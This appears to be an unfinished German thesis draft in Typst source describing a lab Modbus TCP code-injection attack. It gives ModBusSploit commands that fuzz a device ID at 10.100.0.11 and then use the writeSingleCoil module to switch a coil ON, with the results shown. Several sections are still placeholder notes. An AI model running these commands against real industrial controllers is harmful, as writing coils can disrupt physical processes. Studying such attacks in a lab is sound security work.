#import "@preview/htl3r-da:1.0.0" as htl3r
#htl3r.author("Marlene Reder")

== Code Injection
=== Theoretische Grundlagen
#htl3r.info("WAS IST Code Injection")

=== Vorrausetztungen für den Angirff
Kali VM
Wireshark 
python
Terminal
zugang zum netzwerk

=== ModBusSploit
Framework for ModBus TCP Industrial Protocol Exploitation.
module und so erklären

=== Umsetztung - Code Injection
erreichbarkeit testen von beiden geräten ???? \
#htl3r.info("schritte auch mit wireshark nachvollziebar machen")

Script starten
```
python3 ModBusSploit-main/start.py
```
Fuzeer um id herrauszufinden, aber ID Falsch????? id aus wireshark????
```
use modules/auxiliary/scanner/id_fuzzer
set address 10.100.0.11
exploit

ERGEBNIS:
ID FOUND: 0
```
Fuzeer um id herrauszufinden, aber ID Falsch????? id aus wireshark????
```
use modules/exploit/injection/writeSingleCoil
set address 10.100.0.11
set register 4
set id 0 / 1??!?!?!?
set value ON
exploit

ERGEBNIS:
WRITTEN VALUE: 255
```

#figure(
  image("../assets/injection/injcetion-terminal.png"),
  caption: "Hallo"
)


injection analyste Wireshark \
bild Wireshark


=== Fazit ???

=== Quellen --> irgendwo anders hin???
